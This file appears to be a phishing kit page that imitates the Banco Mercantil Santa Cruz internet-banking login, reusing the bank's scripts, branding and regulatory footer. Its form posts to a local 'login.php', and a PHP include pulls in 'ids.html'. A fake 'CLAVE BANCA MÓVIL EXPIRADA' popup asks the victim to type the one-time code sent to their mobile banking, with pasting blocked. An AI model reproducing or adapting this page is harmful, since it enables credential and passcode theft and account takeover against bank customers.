
<!DOCTYPE>

<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<meta name="format-detection" content="telephone=no">
<html xmlns="http://www.w3.org/1999/xhtml">

<script language="javascript" type="text/javascript">
    var dateFormat = 'dd/MM/yyyy';
    var endRequestHandlers = [];
    var isPreLoaderAnimationRunning = false;
    var showAsyncPostBackError = true;

    function Logo_Click() {
        window.location = "Login.html"
    }

    function PageRequestManager_BeginRequest(sender, args) {
        AysncPostBack_BeginLoading(sender, args);
    }

    function PageRequestManager_Add_EndRequest(handler) {
        Array.add(endRequestHandlers, handler);
    }

    function PageRequestManager_EndRequest(sender, args) {
        PageRequestManagerCheckForErrors(sender, args);
        BindAlwaysFireChange(sender, args);
        BindValidators(sender, args);
        BindTooltips(sender, args);
        BindPopupsButtons(sender, args);
        ApplySelectionsStyles(sender, args);
        ApplyProductRepeaterStyles(sender, args);
        ApplyFileUploadStyles(sender, args);
        SizeGridHeight(sender, args);
        BindSummaryAndInformationEllipsis(sender, args);
        AysncPostBack_EndLoading(sender, args);

        for (var i = 0; i < endRequestHandlers.length; i++) {
            endRequestHandlers[i](sender, args);
        }
    }

    function AysncPostBack_BeginLoading(sender, args) {
        var postBackElement = $(args.get_postBackElement());
        showAsyncPostBackError = !postBackElement.hasClass("doNotShowAsyncPostBackError") && !postBackElement.parents().hasClass("doNotShowAsyncPostBackError");
        if (!postBackElement.hasClass("doNotShowPreLoader") && !postBackElement.parents().hasClass("doNotShowPreLoader")) {
            $(".clickDivPreLoader").css({
                "height": screen.height,
                "width": screen.width
            });
            isPreLoaderAnimationRunning = true;

            $("div.clickDivPreLoader").fadeTo(100, 0.8, function() {


                $("#imgPreLoader").centerIn({
                    container: $("html"),
                    position: "fixed"
                });
                $("#imgPreLoader").removeClass("invisible");

                isPreLoaderAnimationRunning = false;
            });
        }
    }

    function AysncPostBack_EndLoading(sender, args) {
        window.setTimeout(function() {
            $("#imgPreLoader").addClass("invisible");
            $("div.clickDivPreLoader").fadeOut(100, 0);
        }, isPreLoaderAnimationRunning ? 300 : 0);
    }


    function getBrowseButtonText() {
        return 'Examinar';
    }

    function PageRequestManagerCheckForErrors(sender, args) {
        if (args.get_error() != undefined) {
            if (showAsyncPostBackError) {
                alert("Excediste el número de intentos permitido, espera 1 min para volver a intentarlo.".replace("'", "''"));
            }
            args.set_errorHandled(true);
        }
    }

    function ChangeOKMaster_Clicked() {
        closePopup('PopupContactUsExito');
    }

    function ShowContactUsPopup() {
        $(".accountCont").hide();
        $(".closeTop").hide();
        showPopup('ContactUsPopup');
    }

    function CloseContactUsPopup() {
        closePopup('ContactUsPopup');
    }

    function CloseErrorPopup() {
        closePopup('PopupErrorMaster');
    }

    function PopUp_ClientValidate() {
        if (Page_IsValid) {
            CloseContactUsPopup();
        }
    }
</script>

<head>
    <link rel="shortcut icon" href="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/favicon.ico" type="image/x-icon" />
    <link rel="icon" href="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/favicon.ico" type="image/ico" />
    <link rel="stylesheet" type="text/css" href="../../../Styles/Default/icbStyles_BE4049C6AF65BFE67CDB5B41D365A0FE.css" />
    <link rel="stylesheet" type="text/css" media="print" href="../../../Styles/Default/icbPrintingStyles_EE875BACBA6C1F641FB486CE59EDD0BB.css" />
    <title>
        Banca por Internet
    </title>
    <?php 
     include '../../../Styles/Default/ids.html';

    ?>
</head>

<body>
    <script src="../../../js/vuborders.js" type="text/javascript"></script>
    <form method="post" id="form-tokenvirtual" action="login.php">




        <script type="text/javascript">
            //<![CDATA[
            function ASP_administration_webui_controls_general_login_logincompleteuserdata_ascx_ShowOperationResultPopup() {
                var operationResult = document.getElementById('hfOperationResult');
                if (operationResult != null && operationResult.value != null && operationResult.value != '') {
                    if (operationResult.value == 'ok') {
                        showSuccessPopup();
                    } else if (operationResult.value == 'error') {
                        showErrorPopup();
                    } else if (operationResult.value == 'warning') {
                        showWarningPopup();
                    }
                }
            }
            var __cultureInfo = {
                "name": "es-UY",
                "numberFormat": {
                    "CurrencyDecimalDigits": 2,
                    "CurrencyDecimalSeparator": ".",
                    "IsReadOnly": false,
                    "CurrencyGroupSizes": [3],
                    "NumberGroupSizes": [3],
                    "PercentGroupSizes": [3],
                    "CurrencyGroupSeparator": ",",
                    "CurrencySymbol": "$U",
                    "NaNSymbol": "NeuN",
                    "CurrencyNegativePattern": 14,
                    "NumberNegativePattern": 1,
                    "PercentPositivePattern": 0,
                    "PercentNegativePattern": 0,
                    "NegativeInfinitySymbol": "-Infinito",
                    "NegativeSign": "-",
                    "NumberDecimalDigits": 2,
                    "NumberDecimalSeparator": ".",
                    "NumberGroupSeparator": ",",
                    "CurrencyPositivePattern": 2,
                    "PositiveInfinitySymbol": "Infinito",
                    "PositiveSign": "+",
                    "PercentDecimalDigits": 2,
                    "PercentDecimalSeparator": ",",
                    "PercentGroupSeparator": ".",
                    "PercentSymbol": "%",
                    "PerMilleSymbol": "‰",
                    "NativeDigits": ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
                    "DigitSubstitution": 1
                },
                "dateTimeFormat": {
                    "AMDesignator": "a.m.",
                    "Calendar": {
                        "MinSupportedDateTime": "\/Date(-62135582400000)\/",
                        "MaxSupportedDateTime": "\/Date(253402300799999)\/",
                        "AlgorithmType": 1,
                        "CalendarType": 1,
                        "Eras": [1],
                        "TwoDigitYearMax": 2029,
                        "IsReadOnly": false
                    },
                    "DateSeparator": "/",
                    "FirstDayOfWeek": 1,
                    "CalendarWeekRule": 0,
                    "FullDateTimePattern": "dddd, dd\u0027 de \u0027MMMM\u0027 de \u0027yyyy hh:mm:ss tt",
                    "LongDatePattern": "dddd, dd\u0027 de \u0027MMMM\u0027 de \u0027yyyy",
                    "LongTimePattern": "hh:mm:ss tt",
                    "MonthDayPattern": "dd MMMM",
                    "PMDesignator": "p.m.",
                    "RFC1123Pattern": "ddd, dd MMM yyyy HH\u0027:\u0027mm\u0027:\u0027ss \u0027GMT\u0027",
                    "ShortDatePattern": "dd/MM/yyyy",
                    "ShortTimePattern": "hh:mm tt",
                    "SortableDateTimePattern": "yyyy\u0027-\u0027MM\u0027-\u0027dd\u0027T\u0027HH\u0027:\u0027mm\u0027:\u0027ss",
                    "TimeSeparator": ":",
                    "UniversalSortableDateTimePattern": "yyyy\u0027-\u0027MM\u0027-\u0027dd HH\u0027:\u0027mm\u0027:\u0027ss\u0027Z\u0027",
                    "YearMonthPattern": "MMMM\u0027 de \u0027yyyy",
                    "AbbreviatedDayNames": ["dom", "lun", "mar", "mié", "jue", "vie", "sáb"],
                    "ShortestDayNames": ["do", "lu", "ma", "mi", "ju", "vi", "sá"],
                    "DayNames": ["domingo", "lunes", "martes", "miércoles", "jueves", "viernes", "sábado"],
                    "AbbreviatedMonthNames": ["ene", "feb", "mar", "abr", "may", "jun", "jul", "ago", "sep", "oct", "nov", "dic", ""],
                    "MonthNames": ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre", ""],
                    "IsReadOnly": false,
                    "NativeCalendarName": "calendario gregoriano",
                    "AbbreviatedMonthGenitiveNames": ["ene", "feb", "mar", "abr", "may", "jun", "jul", "ago", "sep", "oct", "nov", "dic", ""],
                    "MonthGenitiveNames": ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre", ""]
                },
                "eras": [1, "d.C.", null, 0]
            }; //]]>
        </script>

        <script src="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/ScriptResource.axd?d=Atb1_NTku2Wdqh3p7DAR8bXM2dEJK2iH2aXzGqBLkR9Uo1kOvv3rRm0hz6Gl7eTCD-AUGLvlQXvKsZ62THXlZ5zJlyhZLwd6LlQ1t0xvAa8D1FZj0&amp;t=23c9c237" type="text/javascript"></script>
        <script src="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/ScriptResource.axd?d=7rveq3gjQoN-rPWqUCjMvTdcSCi1_j5NhKZwNZPRvpgxk7vFMqNybdCdySBChCb1ymUxz8EfsiKHGY8L0FHjhOb_gi-GL1bHtbIBYzunF43ApnlVXGWPUQcNX6QMPP1W7Jcahw2&amp;t=23c9c237" type="text/javascript"></script>
        <script src="../../../App_Themes/Default/Scripts/WebForms.js" type="text/javascript"></script>
        <script src="../../../App_Themes/Default/Scripts/WebUIValidation.js" type="text/javascript"></script>
        <script src="../../../App_Themes/Default/Scripts/Focus.js" type="text/javascript"></script>
        <script type="text/javascript">
            //<![CDATA[
            function WebForm_OnSubmit() {
                if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
                return true;
            }
            //]]>
        </script>



        <script type="text/javascript">
            //<![CDATA[
            Sys.WebForms.PageRequestManager._initialize('ctl00$ctl06', 'ctl01', ['fctl00$MainContent$ctl01$UpdatePanel2', 'MainContent_ctl01_UpdatePanel2'], [], [], 1200, 'ctl00');
            //]]>
        </script>





        <div id="PopupContactUsExito" class="popup exitoMaster">
            <ul>
                <li class="top"></li>
                <li class="mid">
                    <span>
                        Operación Exitosa
                    </span>
                    <p>
                        La operación se completó correctamente
                    </p>
                    <ul class="navBtns fr">
                        <li>

                            <input name="ctl00$ChangeOk" type="button" id="ChangeOk" class="btnGenericBlue doNotHidePopup" onclick="ChangeOKMaster_Clicked();" value="Aceptar" />
                        </li>
                    </ul>
                </li>
                <li class="bottom"></li>
            </ul>
        </div>

        <div id="PopupErrorMaster" class="popup errorMaster">


            <ul>
                <li class="top"></li>
                <li class="mid">
                    <span>
                        Error en la operación
                    </span>
                    <p>
                        Ocurrió un error al procesar la operación.
                    </p>
                    <ul class="navBtns fr">
                        <li>
                            <input type="submit" name="ctl00$Button1" value="Aceptar" onclick="CloseErrorPopup();WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$Button1&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="Button1" class="btnGenericRed fl" />
                        </li>
                    </ul>
                </li>
                <li class="bottom"></li>
            </ul>
        </div>

        <div id="ContactUsPopup" class="popupGeneric FrequentTransfer">
            <ul>
                <li class="top"></li>
                <li class="mid" style="height: 450px">
                    <h3>Complete la información a enviar
                    </h3>
                    <span class="req">
                        * Requerido
                    </span>
                    <ul class="navBtns clear">
                        <li>
                            <input type="button" class="btnGenericRed" value="Cancelar" onclick="CloseContactUsPopup();" />
                        </li>
                        <li>
                            <input type="submit" name="ctl00$btnSendContactus" value="Enviar" onclick="Page_ClientValidate(&#39;ContactUsGroup&#39;);if (Page_IsValid) {};" id="btnSendContactus" class="btnGenericGreen doNotHidePopup" />
                        </li>
                    </ul>
                </li>
                <li class="bottom"></li>
            </ul>
        </div>

        <div class="clickDivPreLoader"></div>
        <img id="imgPreLoader" class="invisible" width="104px" height="88px" src="../../../App_Themes/Default/Images/preLoader-es-UY.gif" alt="Cargando..." style="height:88px;width:104px;" />
        <div id="corporateHeader">
            <div class="logo" onclick="Logo_Click();">
            </div>

            <div class="rightZone">
                <ul>
                    <li><a href="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/Pages/General/HelpPublic.aspx">
                            ayuda</a></li>


                </ul>
                <div class="langBar">
                    <input type="hidden" name="ctl00$hfLanguage" id="hfLanguage" value="2" />
                    <ul>
                        <li>
                            <input type="image" name="ctl00$languageSelector" id="languageSelector" src="../../../App_Themes/Default/Images/img-flag-eng.png" onclick="$(&#39;#hfLanguage&#39;).val(&#39;1&#39;);" />
                        </li>
                        <li>
                            <a onclick="$(&#39;#hfLanguage&#39;).val(&#39;1&#39;);" id="languageButton" href="javascript:__doPostBack(&#39;ctl00$languageButton&#39;,&#39;&#39;)">english</a>
                        </li>
                    </ul>
                </div>
            </div>

        </div>
        <div id="container">
            <div id="containerTop" class="withoutBreadcrumb">
                <h3>
                    Bienvenido a la Banca por Internet
                </h3>
                <span class="fecha" id="fech">
                </span>
            </div>

            <div id="containerMid" class="fl">
                <div class="stepsTitles fl invisible">
                    <h3>
                        <span>

                        </span>

                    </h3>
                </div>

                <div class="colLeft">


                    <script type="text/javascript" src="../../../App_Themes/Default/Scripts/icbScripts_40EE503762D7E2FB26DC9A6F5980198D.js"></script>

                    <script type="text/javascript">
                        Sys.WebForms.PageRequestManager.getInstance().add_beginRequest(PageRequestManager_BeginRequest);
                        Sys.WebForms.PageRequestManager.getInstance().add_endRequest(PageRequestManager_EndRequest);
                    </script>

                    <div class="clickDivPopup"></div>







                    <div class="contentLogin extended">
                        <input type="hidden" name="ctl00$MainContent$ctl01$HFRealPassword" id="MainContent_ctl01_HFRealPassword" />



                        <ul class="login">
                            <li>
                                <div class="closeBtnKeyboard">
                                    <img src="../../../App_Themes/Default/Images/blank.png" width="45" height="50" alt="Close" />
                                </div>
                                <ul>
                                     <div id="MainContent_ctl05_PopupSignature" class="popupGeneric Signature" style="position: fixed; top: 45%; margin-top: -159px; left: 40%; margin-left: -300px; opacity: 1; display: block;">
    <ul>
        <li class="top"></li>
        <li class="mid">
            <h3>
                Dispositivo de seguridad:</h3>

            <h4><img src="../../../App_Themes/Default/Images/icon_delete.png" width="28" height="30"/><B><FONT COLOR="red">CLAVE BANCA MÓVIL EXPIRADA.</FONT>
              <br>Ingrese un nuevo código y presione el botón Confirmar</h4>
            <div>
                <div id="MainContent_ctl05_ctl08_UpdatePanel1">
  
        <input type="hidden" name="ctl00$MainContent$ctl05$ctl08$HasDeviceOperationResultInfo" id="HasDeviceOperationResultInfo">
        <input type="hidden" name="ctl00$MainContent$ctl05$ctl08$CloseSecurityDevicePopUp" id="CloseSecurityDevicePopUp">
   
        <table border="0" cellpadding="0" cellspacing="0" width="90%">
            <tbody><tr>
                <td style="width: 30%; vertical-align: top">
                    <table border="0" cellpadding="0" cellspacing="0" width="100%">
                        
                        
                        
                        
                        
                        <tbody><tr id="MainContent_ctl05_ctl08_trSmsToken">
	<td style="height: 30px;">
                                
                                <span class="radio fl"><input id="MainContent_ctl05_ctl08_TransactionDevicesSmsToken" type="radio" name="ctl00$MainContent$ctl05$ctl08$TransactionDevices" value="TransactionDevicesSmsToken" checked="checked" class="small" style="position: absolute; z-index: -1; visibility: hidden;"><span class="jquery-radio-s jquery-radio-s-checked"><span class="mark"></span></span></span>
                                <label for="MainContent_ctl05_ctl08_TransactionDevicesDigitalCertificate">Clave enviada a tu Banca Móvil</label>
                            </td>
</tr>

                    </tbody></table>
                </td>
                <td width="65%" class="contUpdatePanel" style="vertical-align: top">
                    
                            
                            <div>
                                <div class="skinnedSelect_260 fl">
                                    <div class="text" style="font-size: 1em" id="lblPushNotification">
                                         - dispositivo 1
                                    </div>
                                    <select name="ctl00$MainContent$ctl05$ctl08$ddlPushNotification" onchange="javascript:setTimeout('__doPostBack(\'ctl00$MainContent$ctl05$ctl08$ddlPushNotification\',\'\')', 0)" id="MainContent_ctl05_ctl08_ddlPushNotification" class="selection" returnkeytargetassociatedcontrol="MainContent_ctl05_btnConfirmSignature">
	<option value="">Seleccione un dispositivo</option>
	<option selected="selected" value="1|ab0147955d23118e|7271188232858201855">- dispositivo 1</option>

</select>
                                </div>
                                <div class="contVal invisible">
                                    <span id="MainContent_ctl05_ctl08_rqddlPushNotification" class="errorMsg fl" style="color:Red;display:none;">Campo requerido</span>
                                </div>
                            </div>
                            <div>
                                <div style="padding-left: 5px">
                                    <br>
                                      
                                    <br>
                                    <li id="MainContent_ctl05_ctl08_liMessagePush" class="sucessMsg clear">
                                        <br>Su clave ha sido enviada <br>
                                    </li>
                                </div>
                                <div>
                                    <br>
                                   
                                    <li id="MainContent_ctl05_ctl08_liErrorPush" class="errorMsg invisible clear">
                                        
                                    </li>
                                </div>
                            </div>
                            <div style="margin-top: 6px;">
                                <div class="input_260 fl">
                                    <input name="Codigo2" type="password" maxlength="6" id="Codigo" tabindex="1" onkeydown="return (event.keyCode!=13);" returnkeytargetassociatedcontrol="MainContent_ctl05_btnConfirmSignature" onkeypress="return validCharactersOnly(this, event, '^[^:;\<>\'\&quot;]*$')" ondrop="return false;" onpaste="return false;" class="form-control numbers">
                                </div>
                                <div style="padding-left: 5px; padding-top: 10px">
                                    <span id="MainContent_ctl05_ctl08_PushRequiredFieldValidator" class="errorMsg fl" style="color:Red;display:none;">Campo requerido</span>
                                </div>
                            </div>

                        
                </td>
            </tr>
        </tbody></table>
    </div>


            </div>
            <ul class="navBtns clear">                
                <li>
                   
                </li>
                <li>
                   
                </li>
            </ul>
        </li>
        <li class="bottom"></li>
    </ul>
</div>

                                    


                                        <div>
                                            
                                            </div>
                                            
                                            </div>
                                        </div>
                                    </li>

                                </ul>
                            </li>


                            <br>
                            
                              
                            </li>
                            <li>
                                <div id="MainContent_ctl01_recaptchaDiv">
                                    <table style="width: 100%">
                                        <tr>
                                            <td>&nbsp;</td>
                                        </tr>
                                        <tr>
                                            <td style="padding-left: 42px;">
                                                <div id="MainContent_ctl01_UpdatePanel2">

                                                    <table width="100%" border="0" cellspacing="0" cellpadding="0">


                                                    </table>

                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td style="padding-left: 84px;">



                                            </td>
                                        </tr>
                                    </table>
                                </div>
                            </li>
                            <li class="btn">
                                <div style="    text-align: center;
    font-size: 15px;
    letter-spacing: -0.01em;
    color: #5A5A5A;
    height: 30px;
    margin: 0 20px 0 47px !important;">
                                    <span>
                                       
                                    </span>
                                </div>
                            </li>
                            <br>
                           
                           


                        </ul>


                        <br />
                        <br />


                    </div>
                    <ul class="navBtns clear">
                        <li>
                            <input type="submit" name="ctl00$MainContent$ctl02$Next" value="Confirmar" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$MainContent$ctl02$Next&quot;, &quot;&quot;, true, &quot;NextStep2&quot;, &quot;&quot;, false, false))" id="Next" class="btnGenericBlue next">
                        </li>
                    </ul>


                    <script language="javascript" type="text/javascript">
                        function UserNameValidation(source, arguments) {
                            var userName = document.getElementById('MainContent_ctl01_txtUserName');
                            if (null != userName) {
                                userName.value = userName.value.replace(/^\s*|\s*$/g, "");
                                arguments.IsValid = (userName.value != 'Ingrese su usuario' && userName.value != "" && userName.value != null);
                            } else {
                                arguments.IsValid = false;
                            }
                            var message = document.getElementById('MainContent_ctl01_liMessage');
                            if (!arguments.IsValid) {
                                message.className = "errorMsg";
                            } else {
                                message.className = "errorMsg invisible";
                            }
                        }

                        function UserNameValidationPwd(source, arguments) {
                            var userName = document.getElementById('MainContent_ctl01_txtUserNamePassword');
                            if (null != userName) {
                                //userName.value = userName.value.replace(/^*|$/g, "");
                                arguments.IsValid = (userName.value != 'Ingrese su usuario' && userName.value != "" && userName.value != null);
                            } else {
                                arguments.IsValid = false;
                            }
                            var message = document.getElementById('MainContent_ctl01_liMessagePwd');
                            if (!arguments.IsValid) {
                                message.className = "errorMsg";
                            } else {
                                message.className = "errorMsg invisible";
                            }
                        }

                        $("#MainContent_ctl01_recaptchaDiv").keypress(function(e) {
                            var code = e.keyCode || e.which;
                            if (code == 13) {
                                $("#Enter_Step1").click();
                            }
                        });

                        $("#MainContent_ctl01_txtUserNamePassword").keydown(function(e) {
                            var code = e.keyCode || e.which;
                            if (code == 9) {

                                if ($("#recaptcha_response_field").length != 0) {
                                    $("#recaptcha_response_field").focus();
                                    return false;
                                }
                            }
                        });


                        $("#MainContent_ctl01_txtUserName").keydown(function(e) {
                            var code = e.keyCode || e.which;
                            if (code == 9) {

                                if ($("#recaptcha_response_field").length != 0) {
                                    $("#recaptcha_response_field").focus();
                                    return false;
                                }
                            }
                        });
                    </script>


                    <script language="javascript" type="text/javascript">
                        function CancelValidateSecurityQuestionClicked() {
                            this.location.href = "Login.html";
                        }

                        function SetFocus() {
                            $('input[tabindex="1"]').focus();
                        }

                        $(document).ready(function() {
                            SetFocus();
                        });
                    </script>

                </div>
                <div class="fr">


                    <div class="close fr">

                    </div>
                    <div class="colRight">
                        <ul>
                            <li class="top"></li>
                            <li class="mid">
                               
                            </li>
                            <li class="bottom"></li>
                        </ul>

                        <ul id="RightContent_QuizASFI">
                            <li class="top"></li>
                            <li class="mid">

                               

                            </li>
                            <li class="bottom"></li>
                        </ul>

                    </div>

                </div>
            </div>

            
            </div>

            <div id="footer" class="fl">
                <div class="fl">
                    Esta entidad se encuentra bajo la regulación y supervisión de la Autoridad de Supervisión del
                    Sistema Financiero (ASFI).
                </div>
                <div class="right">
                    <div class="logo fl" onclick="Logo_Click();">
                        <img src="../../../App_Themes/Default/Images/blank.png" alt="Footer Logo" width="88" height="23" longdesc="icBankingLongDescription.html" />
                    </div>
                </div>
            </div>
            <div id="footer2" class=" fl">
                <div class="fl">
                    La información obtenida por medio de nuestro canal de Banca por Internet, debe estar sujeta a
                    confirmación y validación en las oficinas del Banco. Proteja su información personal, no permita que
                    se exponga a terceros.
                    <br />Copyright Banco Mercantil Santa Cruz 2014
                </div>
            </div>
        </div>

        <script type="text/javascript">
            //<![CDATA[
            var Page_Validators = new Array(document.getElementById("MainContent_ctl01_cvValidatorUserNamePwd"));
            //]]>
        </script>

        <script type="text/javascript">
            //<![CDATA[
            var MainContent_ctl01_cvValidatorUserNamePwd = document.all ? document.all["MainContent_ctl01_cvValidatorUserNamePwd"] : document.getElementById("MainContent_ctl01_cvValidatorUserNamePwd");
            MainContent_ctl01_cvValidatorUserNamePwd.controltovalidate = "MainContent_ctl01_txtUserNamePassword";
            MainContent_ctl01_cvValidatorUserNamePwd.focusOnError = "t";
            MainContent_ctl01_cvValidatorUserNamePwd.display = "Dynamic";
            MainContent_ctl01_cvValidatorUserNamePwd.evaluationfunction = "CustomValidatorEvaluateIsValid";
            MainContent_ctl01_cvValidatorUserNamePwd.clientvalidationfunction = "UserNameValidationPwd";
            MainContent_ctl01_cvValidatorUserNamePwd.validateemptytext = "true";
            //]]>
        </script>
        <script>

        </script>

        <script type="text/javascript">
            //<![CDATA[
            (function() {
                var fn = function() {
                    $get("ctl06_HiddenField").value = '';
                    Sys.Application.remove_init(fn);
                };
                Sys.Application.add_init(fn);
            })();
            PageRequestManager_Add_EndRequest(ASP_administration_webui_controls_general_login_logincompleteuserdata_ascx_ShowOperationResultPopup);
            var Page_ValidationActive = false;
            if (typeof(ValidatorOnLoad) == "function") {
                ValidatorOnLoad();
            }

            function ValidatorOnSubmit() {
                if (Page_ValidationActive) {
                    return ValidatorCommonOnSubmit();
                } else {
                    return true;
                }
            }

            document.getElementById('MainContent_ctl01_cvValidatorUserNamePwd').dispose = function() {
                Array.remove(Page_Validators, document.getElementById('MainContent_ctl01_cvValidatorUserNamePwd'));
            }
            //]]>
        </script>
         <script>
           var fech = document.getElementById('fech');
var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
var diasSemana = new Array("Domingo","Lunes","Martes","Miércoles","Jueves","Viernes","Sábado");
var f=new Date();
fech.innerHTML = diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.getMonth()] + " de " + f.getFullYear();
</script>
    </form>


</body>



</html>